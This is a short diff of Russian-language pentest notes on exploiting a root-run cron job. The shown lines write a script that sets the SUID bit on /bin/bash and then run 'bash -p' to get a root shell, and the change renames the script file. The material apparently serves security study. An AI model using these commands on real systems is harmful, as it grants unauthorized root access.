@@ -6,7 +6,8 @@ cat /etc/crontab
 Эксплуатация, если есть возможность редактировать скрипт, который запускается от root:
 1. Добавить SUID бит
 echo '#!/bin/bash
-chmod u+s /bin/bash' > .mysecretcronjob.sh
+chmod u+s /bin/bash' > script.sh
+
 
 bash -p
 
